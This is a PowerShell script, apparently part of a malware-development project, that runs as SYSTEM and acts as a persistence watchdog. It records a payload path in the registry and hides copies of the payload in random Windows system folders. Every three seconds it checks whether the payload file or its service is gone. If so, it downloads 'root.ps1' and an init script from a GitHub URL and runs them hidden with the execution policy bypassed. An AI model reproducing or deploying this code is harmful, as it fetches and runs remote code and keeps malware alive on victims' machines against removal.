#script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$basePath
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
$b = $basePath -replace '([{}])', '`$1'
echo $basePath >> "C:\Users\maldev\Downloads\root_mon.txt"
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)

$serviceName = "MyRootService" # change this to the name of the service
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$propertyName = "root"
$item = Get-ItemProperty -Path "$basePath" -Name $propertyName
$canUpdateRootPath = $false

if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
    red add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $true
}

if (-not($item)) {
    reg add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $false
}

else{
    $rootPath = $item.$propertyName
    $canUpdateRootPath = $true
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg -path $regPath
    $serv = Check-Service -name $serviceName

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        if($canUpdateRootPath){
            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootPath = "$rootPath\root.ps1"
            reg add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
            #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
        }
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    
    elseif($regS -or $serv){
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    $canUpdateRootPath=$true
    
    Start-Sleep -Seconds 3
}